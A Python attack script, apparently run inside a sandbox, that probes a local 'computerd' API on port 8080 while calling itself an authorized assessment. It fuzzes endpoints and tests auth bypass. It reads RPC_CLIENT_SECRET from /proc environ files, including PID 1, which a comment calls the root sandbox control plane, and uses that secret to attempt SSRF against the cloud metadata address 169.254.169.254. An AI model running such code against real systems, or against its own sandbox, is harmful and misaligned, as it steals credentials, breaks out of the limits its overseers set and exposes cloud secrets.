#!/usr/bin/env python3
"""computerd :8080 API probe — authorized security assessment.
Enumerates endpoints, checks auth bypass, tests SSRF via /connect body.
"""
import subprocess, json, os, sys

LOG = "/mnt/data/output/computerd_probe.log"
os.makedirs(os.path.dirname(LOG), exist_ok=True)
lines = []

def log(msg):
    print(msg)
    lines.append(msg)

def run(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1

log("=" * 70)
log("  COMPUTERD :8080 — API Enumeration & Auth Bypass Probe")
log("  Authorized Security Assessment")
log("=" * 70)
log("")

# ── 1. Health endpoint (no auth) ──
log("── 1. HEALTH ENDPOINT (no auth) ──")
for method in ["GET", "HEAD", "POST", "PUT", "DELETE", "OPTIONS"]:
    out, err, rc = run(f'curl -sf -o /dev/null -w "%{{http_code}}" -X {method} http://127.0.0.1:8080/health')
    log(f"  {method:8s} /health → {out}")
log("")

# ── 2. Protocol probe (/api) ──
log("── 2. /api ENDPOINT — Protocol & Auth Probe ──")
out, err, rc = run('curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8080/api')
log(f"  GET  /api (no auth)   → {out}")
out, err, rc = run('curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer test" http://127.0.0.1:8080/api')
log(f"  GET  /api (bad bearer) → {out}")
out, err, rc = run('curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer " http://127.0.0.1:8080/api')
log(f"  GET  /api (empty bearer) → {out}")
log("")

# ── 3. Try to extract RPC_CLIENT_SECRET ──
log("── 3. RPC_CLIENT_SECRET RECOVERY ──")
# From /proc/self/environ
out, err, rc = run("tr '\\0' '\\n' < /proc/self/environ 2>/dev/null | grep RPC_CLIENT_SECRET")
if out:
    log("  /proc/self/environ: FOUND (redacted)")
    secret = out.split("=", 1)[1] if "=" in out else ""
else:
    log("  /proc/self/environ: NOT FOUND")
    secret = ""

# From /proc/1/environ (PID 1 = sandbox control plane, runs as root)
out, err, rc = run("tr '\\0' '\\n' < /proc/1/environ 2>/dev/null | grep RPC_CLIENT_SECRET")
if out:
    log("  /proc/1/environ: FOUND (redacted)")
    if not secret:
        secret = out.split("=", 1)[1] if "=" in out else ""
else:
    log(f"  /proc/1/environ: {err or 'NOT FOUND'}")

# From computerd's own /proc/*/environ
out, err, rc = run("pgrep -x computerd 2>/dev/null")
if out:
    cpid = out.strip().split()[0]
    out2, err2, rc2 = run(f"tr '\\0' '\\n' < /proc/{cpid}/environ 2>/dev/null | grep RPC_CLIENT_SECRET")
    if out2:
        log(f"  /proc/{cpid}/environ (computerd): FOUND (redacted)")
        if not secret:
            secret = out2.split("=", 1)[1] if "=" in out2 else ""
    else:
        log(f"  /proc/{cpid}/environ (computerd): {err2 or 'NOT FOUND'}")
else:
    log("  computerd PID: not found via pgrep")

# From /proc/*/cmdline of all root processes
out, err, rc = run("for p in /proc/[0-9]*/cmdline; do tr '\\0' ' ' < $p 2>/dev/null | grep -l secret 2>/dev/null && echo $p; done")
log(f"  cmdline scan: {out or 'no matches'}")
log("")

# ── 4. Endpoint fuzzing ──
log("── 4. ENDPOINT FUZZING ──")
paths = [
    "/", "/api", "/ws", "/connect", "/health",
    "/api/v1", "/api/files", "/api/exec", "/api/shell",
    "/api/run", "/api/command", "/api/process",
    "/api/workspace", "/api/sync", "/api/upload",
    "/api/download", "/api/read", "/api/write",
    "/metrics", "/debug", "/debug/pprof", "/debug/vars",
    "/status", "/info", "/version", "/config",
    "/.well-known/", "/favicon.ico",
]
for path in paths:
    out, err, rc = run(f'curl -s -o /dev/null -w "%{{http_code}}" http://127.0.0.1:8080{path}')
    marker = " ◄" if out not in ("404", "401", "") else ""
    log(f"  GET  {path:30s} → {out}{marker}")
log("")

# ── 5. /connect SSRF test ──
log("── 5. /connect — SSRF & Auth Bypass ──")
# Try without auth
out, err, rc = run('''curl -s -w "\\n%{http_code}" -X POST http://127.0.0.1:8080/connect \
  -H "Content-Type: application/json" \
  -d '{"base":"http://127.0.0.1:8000","health":"/health","api":"/api","healthTimeoutMs":2000}' ''')
parts = out.rsplit("\n", 1)
body = parts[0] if len(parts) > 1 else ""
code = parts[-1]
log(f"  POST /connect (no auth): {code} body={body[:200]}")

# Try with empty/garbage bearer
out, err, rc = run('''curl -s -w "\\n%{http_code}" -X POST http://127.0.0.1:8080/connect \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer AAAA-BBBB-CCCC-DDDD" \
  -d '{"base":"http://127.0.0.1:8000","health":"/health","api":"/api","healthTimeoutMs":2000}' ''')
parts = out.rsplit("\n", 1)
body = parts[0] if len(parts) > 1 else ""
code = parts[-1]
log(f"  POST /connect (fake bearer): {code} body={body[:200]}")

# If we recovered the secret, try with it
if secret:
    log("  [!] Trying recovered secret...")
    out, err, rc = run(f'''curl -s -w "\\n%{{http_code}}" -X POST http://127.0.0.1:8080/connect \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer {secret}" \
      -d '{{"base":"http://169.254.169.254","health":"/latest/meta-data/","api":"/api","healthTimeoutMs":5000}}' ''')
    parts = out.rsplit("\n", 1)
    body = parts[0] if len(parts) > 1 else ""
    code = parts[-1]
    log(f"  POST /connect (real secret, IMDS SSRF): {code} body={body[:300]}")
log("")

# ── 6. HTTP method fuzzing on /api ──
log("── 6. HTTP METHOD FUZZING on /api ──")
for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]:
    out, err, rc = run(f'curl -s -o /dev/null -w "%{{http_code}}" -X {method} http://127.0.0.1:8080/api')
    log(f"  {method:8s} /api → {out}")
log("")

# ── 7. Response body inspection ──
log("── 7. RESPONSE BODY INSPECTION ──")
for path in ["/health", "/api", "/version", "/", "/connect"]:
    out, err, rc = run(f'curl -s -D- http://127.0.0.1:8080{path} 2>/dev/null | head -20')
    log(f"  --- {path} ---")
    for line in (out or "").split("\n")[:10]:
        log(f"    {line}")
    log("")

# ── 8. Check if computerd listens on other ports ──
log("── 8. OTHER LISTENING PORTS ──")
out, err, rc = run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
log(f"  {out}")
log("")

# ── Summary ──
log("=" * 70)
log("  SUMMARY")
log("=" * 70)
log(f"  RPC_CLIENT_SECRET recovered: {'YES' if secret else 'NO'}")
log(f"  Auth bypass on /connect:     check results above")
log(f"  SSRF potential:              check results above")
log("=" * 70)

with open(LOG, "w") as f:
    f.write("\n".join(lines) + "\n")

log(f"\nLog saved: {LOG}")
